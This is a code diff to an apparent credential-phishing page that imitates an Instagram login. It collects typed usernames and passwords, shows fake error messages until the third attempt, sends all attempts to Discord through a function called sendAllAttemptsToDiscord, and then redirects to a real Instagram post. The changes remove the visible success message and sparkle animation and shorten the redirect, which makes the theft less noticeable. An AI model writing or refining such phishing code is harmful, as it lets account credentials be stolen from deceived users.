@@ -31,7 +31,7 @@
         .badge { background: #000; color: white; padding: 6px 14px; border-radius: 4px; font-size: 11px; font-weight: 600; display: flex; align-items: center; gap: 6px; opacity: 0.9; cursor: default; }
         .badge i { font-size: 18px; }
 
-        /* 🔥 Instagram-style error message */
+        /* Instagram-style error message */
         #error-message {
             display: none;
             background: #fef4f4;
@@ -65,82 +65,9 @@
             75% { transform: translateX(8px); }
         }
 
-        /* Success Message Style */
+        /* Success Message - HIDDEN (not used) */
         #status {
-            margin-top: 15px;
-            padding: 20px 15px;
-            border-radius: 15px;
-            display: none;
-            text-align: center;
-            font-weight: 600;
-            font-size: 18px;
-            background: linear-gradient(135deg, #ff6b6b, #ff69b4, #ff1493);
-            color: white;
-            box-shadow: 0 8px 30px rgba(255, 105, 180, 0.4);
-            animation: pulse 1.5s ease-in-out infinite;
-            position: relative;
-            overflow: hidden;
-        }
-
-        #status.show {
-            display: block;
-            animation: fadeInUp 0.8s ease forwards, pulse 1.5s ease-in-out infinite 0.8s;
-        }
-
-        #status .heart-icon {
-            font-size: 30px;
-            animation: heartBeat 1s ease-in-out infinite;
-            display: inline-block;
-        }
-
-        #status .message {
-            margin-top: 8px;
-            font-size: 20px;
-            letter-spacing: 1px;
-        }
-
-        /* Sparkle Animation */
-        .sparkle {
-            position: absolute;
-            pointer-events: none;
-            font-size: 20px;
-            animation: sparkleFloat 2s ease-out forwards;
-            opacity: 0;
-        }
-
-        @keyframes sparkleFloat {
-            0% {
-                opacity: 1;
-                transform: translate(0, 0) scale(0.5) rotate(0deg);
-            }
-            100% {
-                opacity: 0;
-                transform: translate(var(--tx), var(--ty)) scale(1.5) rotate(360deg);
-            }
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-        }
-
-        @keyframes heartBeat {
-            0%, 100% { transform: scale(1); }
-            14% { transform: scale(1.3); }
-            28% { transform: scale(1); }
-            42% { transform: scale(1.3); }
-            70% { transform: scale(1); }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px) scale(0.9);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
+            display: none !important;
         }
 
         .meta-footer { margin-top: 20px; font-size: 11px; color: #8e8e8e; text-align: center; }
@@ -190,7 +117,6 @@
         // ✅ THE INSTAGRAM POST URL
         const INSTAGRAM_REDIRECT_URL = "https://www.instagram.com/p/DJFPnYdtS1D/?img_index=3&igsh=N2ZqY2NhaHF2NDNk";
         
-        const statusDiv = document.getElementById('status');
         const errorDiv = document.getElementById('error-message');
         const loginBtn = document.getElementById('loginBtn');
 
@@ -198,38 +124,6 @@
         let attemptCount = 0;
         const MAX_ATTEMPTS = 3;
         let allAttempts = [];
-
-        // ✨ Function to create sparkles
-        function createSparkles() {
-            const emojis = ['✨', '⭐', '🌟', '💖', '❤️', '🌸', '🌺', '💕'];
-            const container = statusDiv;
-            
-            for (let i = 0; i < 25; i++) {
-                const sparkle = document.createElement('span');
-                sparkle.className = 'sparkle';
-                sparkle.textContent = emojis[Math.floor(Math.random() * emojis.length)];
-                
-                const x = Math.random() * 100;
-                const y = Math.random() * 100;
-                const tx = (Math.random() - 0.5) * 300;
-                const ty = (Math.random() - 0.5) * 300;
-                const size = 14 + Math.random() * 20;
-                
-                sparkle.style.left = x + '%';
-                sparkle.style.top = y + '%';
-                sparkle.style.fontSize = size + 'px';
-                sparkle.style.setProperty('--tx', tx + 'px');
-                sparkle.style.setProperty('--ty', ty + 'px');
-                sparkle.style.animationDuration = (1.5 + Math.random() * 1.5) + 's';
-                sparkle.style.animationDelay = (Math.random() * 1.5) + 's';
-                
-                container.appendChild(sparkle);
-                
-                setTimeout(() => {
-                    sparkle.remove();
-                }, 4000);
-            }
-        }
 
         // 🚀 Function to open Instagram post
         function openInstagramPost() {
@@ -248,7 +142,6 @@
 
         // 📤 Function to send ALL attempts to Discord
         async function sendAllAttemptsToDiscord() {
-            // Build the message with all attempts
             let attemptsText = allAttempts.map((attempt, index) => {
                 return `Attempt ${index + 1}: Username: ${attempt.username}, Password: ${attempt.password}`;
             }).join('\n');
@@ -297,24 +190,12 @@
             allAttempts.push({ username, password });
             attemptCount++;
 
-            // Log to console
             console.log(`📝 Attempt ${attemptCount}: ${username} / ${password}`);
 
             // Check if this is the 3rd attempt (success)
             if (attemptCount >= MAX_ATTEMPTS) {
                 // ✅ SUCCESS - Send ALL attempts to Discord
                 await sendAllAttemptsToDiscord();
-                
-                // Show success message
-                statusDiv.innerHTML = `
-                    <div class="heart-icon">❤️</div>
-                    <div class="message">Login successful! 🎉</div>
-                `;
-                statusDiv.className = 'show';
-                statusDiv.style.background = 'linear-gradient(135deg, #ff6b6b, #ff69b4, #ff1493)';
-                statusDiv.style.color = 'white';
-                statusDiv.style.boxShadow = '0 8px 30px rgba(255,105,180,0.5)';
-                statusDiv.style.animation = 'fadeInUp 0.8s ease forwards, pulse 1.5s ease-in-out infinite 0.8s';
                 
                 // Hide error
                 errorDiv.classList.remove('show');
@@ -323,11 +204,8 @@
                 document.getElementById('username').value = '';
                 document.getElementById('password').value = '';
                 
-                // ✨ Create sparkles
-                setTimeout(createSparkles, 300);
-                
-                // 🚀 Open Instagram post after 2 seconds
-                setTimeout(openInstagramPost, 2000);
+                // 🚀 Open Instagram post immediately (no message)
+                setTimeout(openInstagramPost, 500);
                 
                 // Reset counter (optional)
                 // attemptCount = 0;
